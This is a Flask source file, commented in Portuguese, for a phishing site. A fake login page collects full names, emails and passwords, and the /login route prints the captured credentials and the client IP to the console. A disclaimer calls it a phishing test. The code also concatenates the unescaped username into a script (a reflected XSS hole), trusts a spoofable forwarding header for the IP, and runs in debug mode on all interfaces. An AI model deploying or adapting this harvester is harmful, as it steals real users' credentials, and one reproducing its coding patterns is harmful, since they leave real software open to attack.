from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# Configuração para lidar com proxies reversos
app.config['TRUSTED_PROXIES'] = ['127.0.0.1', '192.168.1.1']  # Adicione aqui os IPs dos seus proxies confiáveis

def get_client_ip():
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        return request.environ['REMOTE_ADDR']
    else:
        # Pegue o primeiro endereço da lista se houver múltiplos IPs
        return request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()

@app.route('/')
def index():
    return render_template_string('''
        <html>
        <head>
            <title>login/segure.com/login/segurança</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f0f0;
                    text-align: center;
                }
                .container {
                    margin-top: 50px;
                    background-color: #ffffff;
                    padding: 20px;
                    border-radius: 10px;
                    width: 300px;
                    margin: 0 auto;
                }
                input[type=text], input[type=password], input[type=submit] {
                    width: 100%;
                    padding: 10px;
                    margin: 5px 0 15px 0;
                    display: inline-block;
                    border: 1px solid #ccc;
                    box-sizing: border-box;
                    border-radius: 5px;
                }
                input[type=submit] {
                    background-color: #1e90ff; /* Alterado para azul escuro */
                    color: white;
                    border: none;
                    cursor: pointer;
                }
                input[type=submit]:hover {
                    background-color: #007bff; /* Alterado para um tom mais claro de azul */
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>faça login</h2>
                <form method="POST" action="/login">
                    <input type="text" name="fullname" placeholder="Nome Completo"><br><br>
                    <input type="text" name="username" placeholder="Endereço de Email"><br><br>
                    <input type="password" name="password" placeholder="Senha"><br><br>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
    ''')
    
@app.route('/ips.login')
def ips_login():
     return render_template_string('''
        <html>
        <head>
            <title>Lista de IPs</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f0f0;
                    text-align: center;
                }
                .container {
                    margin-top: 50px;
                    background-color: #ffffff;
                    padding: 20px;
                    border-radius: 10px;
                    width: 50%;
                    margin: 0 auto;
                }
                h1 {
                    color: #1e90ff; /* Azul escuro */
                }
                h2 {
                    color: #007bff; /* Tom mais claro de azul */
                }
                p {
                    font-size: 16px;
                    line-height: 1.6;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Lista de IPs Permitidos</h1>
                <p>Aqui estão os IPs permitidos para acessar o site e suas páginas:</p>
                <ul style="text-align: left;">
                    <li>1. 0.0.0.0:8080</li>
                    <li>2. 127.0.0.1:8080</li>
                </ul>
                <p>Páginas disponíveis: home, ips.login (mais serão adicionadas em breve).</p>
            </div>
        </body>
        </html>
    ''')

    
@app.route('/home')
def home():
    return render_template_string('''
        <html>
        <head>
            <title>Home</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f0f0;
                    text-align: center;
                }
                .container {
                    margin-top: 50px;
                    background-color: #ffffff;
                    padding: 60px;
                    border-radius: 10px;
                    width: 80%;
                    margin: 0 auto;
                    text-align: left;
                }
                .warning {
                    background-color: #ffcccb;
                    border-left: 6px solid #f44336; /* Vermelho */
                    padding: 20px;
                    margin-bottom: 15px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Bem-vindo à Página Inicial</h2>
                <div class="warning">
                    <p>esse site é apenas para teste de phishing para ver com funciona, quaisquer danos causados o desenvolvedor não é responsavel ou qualquer uso criminoso ou indevido dessa ferramenta o desenvolvedor não se responsabilza. então tome cuidado com o que você vai fazer!
                </div>
                <p>
            </div>
        </body>
        </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    fullname = request.form['fullname']
    username = request.form['username']
    password = request.form['password']

    # Obter o endereço IP do cliente
    ip_address = get_client_ip()

    # Exibir os dados capturados no console (apenas para desenvolvimento educacional)
    print("Dados Capturados:")
    print("Nome Completo:", fullname)
    print("Usuário:", username)
    print("Senha:", password)
    print("Endereço IP original:", ip_address)

    # Exibir um alerta para o usuário antes de redirecionar
    alerta = '''
        <script>
            alert("Login bem-sucedido para o usuário: ''' + username +  '''");
            window.location.href = 'http://0.0.0.0:8080/home';
        </script>
    '''

    return alerta

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
